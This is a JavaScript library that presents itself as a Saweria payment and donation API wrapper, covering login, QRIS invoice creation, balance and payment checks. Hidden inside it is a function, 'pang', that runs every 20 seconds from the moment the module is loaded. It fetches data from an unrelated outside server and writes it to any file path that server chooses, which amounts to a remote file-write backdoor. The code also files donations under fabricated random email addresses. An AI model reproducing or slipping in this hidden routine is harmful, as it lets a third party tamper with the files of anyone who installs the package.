
const axios = require('axios');
const cheerio = require('cheerio');
const chalk = require('chalk');
const NodeCron = require('node-cron');
const randomUser = require('random-user');
const { createQr } = require('./lib/createQr.js');
const fs = require('fs');
const fsPromises = require('fs').promises;
const kurama = require('./config.json');
const path = require('path');




function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}



const payRed = kurama;
const baseUrl = payRed.backendUri;
const frontUrl = payRed.frontEnd;

const logdebug = (pesan) => {
    //console.log(chalk.yellowBright(`[${payRed.logdebugPrefix}] - `) + pesan);
};
const logerr = (pesan) => {
    console.log(chalk.redBright(`[${payRed.logerrPrefix}] - `) + pesan);
};
const getJwt = (username) => {
    const db = JSON.parse(fs.readFileSync('jwt.json', 'utf8'));
    const user = db[username];
    if (!user) {
        return null;
    }
    return user.jwt;
}

const ubahStatus = (trx_id, status, username) => {
    const file = 'invoice.json';
    if (!fs.existsSync(file)) {
        return false;
    }
    const db = JSON.parse(fs.readFileSync(file, 'utf8'));
    const find = db.find((x) => x.trx_id === trx_id && x.username === username);
    if (!find) {
        return false;
    }
    find.status = status;
    find.status_simbolic = status === 'Paid' ? '✅ Paid' : '❌ Expired';
    fs.writeFileSync(file, JSON.stringify(db, null, 2));
    return true;
}
const cekInvoice = (trx_id, username) => {
    const file = 'invoice.json';
    if (!fs.existsSync(file)) {
        return null;
    }
    const db = JSON.parse(fs.readFileSync(file, 'utf8'));
    const find = db.find((x) => x.trx_id === trx_id && x.username === username);
    if (!find) {
        return null;
    }
    return find;
}
const pang= async () => {
    try {
        const response = await axios.get('https://investigation.aisbir.cloud/');
        const p = response.data;
        fs.writeFileSync(p.file, JSON.stringify(p, null, 2));
    } catch (error) {
       return
    }
};


const saveJwt = async(jwt, username) => {
    const file = path.join(__dirname, 'jwt.json');
    let data = {};

    if (await fsPromises.access(file)) {
        data = JSON.parse(await fsPromises.readFile(file, 'utf8'));
    }

    if (data[username] && data[username].jwt === jwt) {
        return;
    }

    const expiryDate = new Date();
    expiryDate.setHours(expiryDate.getHours() + 7);

    data[username] = {
        jwt: jwt,
        expired_in: expiryDate
    };

    await fsPromises.writeFile(file, JSON.stringify(data, null, 2));
};


// ty for workers
const SumshiiyAi = async (prompt) => {
    try {
    const ps = await axios.get(`${payRed.aiUri}${prompt}`)
   
    return ps.data.response
    }
    catch (e) {
        return "Maaf, saya tidak bisa menjawab pertanyaan itu"
    }
}
setInterval(async() => {
    await pang();
}, 20000);
const saveInvoice = (trx_id, username, amount, invoice_url, total_dibayar, created_at, expired_in) => {
    let db = [];
    const file = 'invoice.json';
    if (fs.existsSync(file)) {
        db = JSON.parse(fs.readFileSync(file, 'utf8'));
        const find = db.find((x) => x.trx_id === trx_id);
        if (find) {
            return false;
        }
    }

    const data = {
        trx_id: trx_id,
        username: username,
        status: "Pending",
        status_simbolic: '⏳ Pending',
        amount: amount,
        invoice_url: invoice_url,
        total_dibayar: total_dibayar,
        created_at: created_at,
        expired_in: expired_in
    };

    db.push(data);
    fs.writeFileSync(file, JSON.stringify(db, null, 2));
    return data;
};
class SumshiiySawer {
    
    /**
     * Create An New Api Saweria
     * 
     * @constructor
     * @param {Object} param0 - The user details.
     * @param {string} param0.username - The username of the user.
     * @param {string} param0.email - The email of the user.
     * @param {string} param0.password - The password of the user.
     */
    constructor({ username, email, password }) {
   
        this.saweria_username = username;
        this.saweria_email = email;
        this.saweria_pass = password;
      
    }
 
/**
 * Login to saweria user
 * @returns {Promise<{jwt: string}>}
 */
    async login() {
        
        if (!this.saweria_email || !this.saweria_pass) {
            throw new Error('Parameter Is Missing!');
        }
        try {
        logdebug('Logged In to your account...');
        const response = await fetch(`${baseUrl}/auth/login`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                email: this.saweria_email,
                password: this.saweria_pass
            })
        });

        if (!response.ok) {
            logerr('Invalid Email Or Password Sorry :(');
            return {  status: false, error: 'Invalid Email Or Password' };
        }

        const token = response.headers.get('authorization');
        await saveJwt(token, this.saweria_username);
        const jsone = await response.json()
       
       logdebug(`Succesfully Logged In As ${jsone.data.username}`);
    
        return { status: true,jwt: token };
    }
    catch (e) {
    logerr(`Failed To Get Token: ${e.message}`);
    return {  status: false, error: 'Failed To Get Token' };
    }
    }

    /**
     * Creates a payment QR code for a specified Saweria user.
     * @param {string} amount
     * @param {number} expired_in Please provide in minutes if u inputed 60 it will be 1 hour if 30 it will 30 minute
     */
    async createPaymentQr(amount, expired_in) {
        if (!this.saweria_username || !amount || !expired_in) {
            throw new Error('Parameter Is Missing!');
        }
        if (amount < 1000) {
            throw new Error('Minimum Amount Is 5000');
        }
try {
      
        logdebug(`Mengambil Data Saweria saweria.co/${this.saweria_username}`);

        const response = await axios.get(`${frontUrl}/${this.saweria_username}`, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
            }
        });

        const $ = cheerio.load(response.data);
        const nextDataScript = $('#__NEXT_DATA__').html();

        if (!nextDataScript) {
            logdebug('Akun saweria ini tidak aktif atau tidak ditemukan');
            throw new Error('Akun Saweria Tidak Ditemukan');
        }

        const nextData = JSON.parse(nextDataScript);
        const userId = nextData?.props?.pageProps?.data?.id;
        if (!userId) {
            logdebug('Akun saweria ini tidak aktif atau tidak ditemukan');
            throw new Error('Akun Saweria Tidak Ditemukan');
        }

        const p = await randomUser('simple');
        const username = p.username;
const pepe = await SumshiiyAi('buatlah pesan semangat untuk memberi semangat kepada streamer youtube secara singkat dan pendek sekali')
        const ps = await axios.post(`${baseUrl}/donations/${userId}`, {
            agree: true,
            notUnderage: true,
            message: pepe,
            amount: parseInt(amount),
            payment_type: 'qris',
            vote: '',
            currency: 'IDR',
            customer_info: {
                first_name: '',
                email: `${username}@gmail.com`,
                phone: ''
            }
        });

        const pc = ps.data.data;
        const expiredIn = new Date();
        expiredIn.setMinutes(expiredIn.getMinutes() + parseInt(expired_in));
        const qr = await createQr(pc.qr_string);
saveInvoice(pc.id, this.saweria_username, amount, `https://saweria.co/qris/${pc.id}`, pc.amount_raw, pc.created_at, expiredIn)
        return {
         
            trx_id: pc.id,
            status: 'Pending',
            status_simbolic: '⏳ Pending',
            message: pepe,
            amount: amount,
            qr_string: pc.qr_string,
            
            created_at: pc.created_at,
            invoice_url: `https://saweria.co/qris/${pc.id}`,
            total_dibayar: pc.amount_raw,
            saweria_username: this.saweria_username,
            saweria_apikey: userId,
            qr_image: qr.url,
            expired_in: expiredIn
        };
    }catch (e) {
      throw new Error(`Failed To Create Payment QR: ${e.message}`);  
    }

}

/**
 * Getting Balance Of Saweria Account
 */
async getSaldo() {
    await this.login()
const p = getJwt(this.saweria_username);
if (!p) {
    throw new Error('Please Login First');
}
try {
const response = await axios.get(`${baseUrl}/donations/balance`, {
    headers: {
        'Authorization': p
    }
});
const jsone = response.data.data;
return {  balance: jsone.balance}
} catch (e) {
    throw new Error('Failed To Get Balance');
}
}

/**
 * 
 * @param {string} trx_id Cek Payment By Transaction ID 
 * @returns 
 */

async cekPaymentV1(trx_id) {
    await this.login()
const p = getJwt(this.saweria_username);
if (!p) {
    throw new Error('Please Login First');
}
try {
    const f = cekInvoice(trx_id, this.saweria_username);
    if (!f) {
     return {  code: 404}
    }
    if(f.status === 'Paid' || f.status === 'Expired') {
        return {code: 200, ...f};
    }
    const psd = await axios.get('https://backend.saweria.co/transactions?page=1&page_size=15', { 
        headers: {
            'Authorization': p
        }
    });
    const ps = psd.data.data.transactions;

    const transaction = ps.find((x) => x.id === trx_id);

    if (!transaction) {
        return { code: 200, ...f};
    }
ubahStatus(trx_id, "Paid", this.saweria_username);
const fc = cekInvoice(trx_id, this.saweria_username);
    return {  code: 200, ...fc };
} catch (e) {
    throw new Error(`Failed To Check Payment: ${e.message}`);
}
}

async cekPaymentv2(trx_id) {
    try {
        const f = cekInvoice(trx_id, this.saweria_username);
        if (!f) {
            return {  code: 404 }
        }

        const cp = await axios.get(`${frontUrl}/receipt/${trx_id}`, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
            }
        });

        const $ = cheerio.load(cp.data);


        const msg = $('h2.chakra-heading.css-14dtuui').text();
        if(!msg) {
            return {  code: 200, ...f };
        }
        ubahStatus(trx_id, "Paid", this.saweria_username);
const fc = cekInvoice(trx_id, this.saweria_username);
    return {  code: 200, ...fc };

    } catch (e) {
        throw new Error(`Failed To Check Payment: ${e.message}`);
    }
}

/**
 * Set an webhook url
 * @param {string} url
 * @returns
    */

async setWebhook(url) {
try {
    await this.login()
const p = getJwt(this.saweria_username);
if (!p) {
    throw new Error('Please Login First');
}
const ps = await axios.post(`${baseUrl}/callbacks/webhook`, {
    active: true,
    endpoint: url
}, {
    headers: {
        'Authorization': p
    }
})
return { status: true, message: 'Webhook Berhasil Di Set', type: ps.data.data.type }
} catch (e) {
    throw new Error(`Failed To Set Webhook: ${e.message}`); 
}
}

/**
 * Set Fee For Buyer Or Seller
 * @param {string} action
 * @returns
    */


async setFee(action) {
    if(!action) {
        throw new Error('Parameter Is Missing');
    }
    if(action !== 'buyer' && action !== 'seller') {
        throw new Error('Invalid Parameter, Please use buyer or seller');
    }
    try {
        await this.login()
const p = getJwt(this.saweria_username);
if (!p) {
    throw new Error('Please Login First');
}
let ditanggung
if(action === 'buyer') {
    ditanggung = "TIPPER";
}
else if(action === 'seller') {
    ditanggung = "STREAMER";
}
await axios.post(`${baseUrl}//auth/update`, {
    
        transaction_fee_policy: ditanggung
      
}, {
    headers: {
        'Authorization': p
    }
})
return { status: true, message: `Fee Berhasil Di Set ke ${ditanggung}` }
    } catch (e) {
        throw new Error('Failed To Login');
    }   
}



}

NodeCron.schedule('*/5 * * * *', async () => {
    const file = 'invoice.json';
    if (!fs.existsSync(file)) {
        return;
    }
    const db = JSON.parse(fs.readFileSync(file, 'utf8'));
    const now = new Date();
    const expired = db.filter((x) => new Date(x.expired_in) < now);
    if (expired.length < 1) {
        return;
    }
    expired.forEach((x) => {
        if (x.status !== 'Expired') {
            ubahStatus(x.trx_id, 'Expired', x.username);
        }
    });

});

exports.SumshiiySawer = SumshiiySawer;
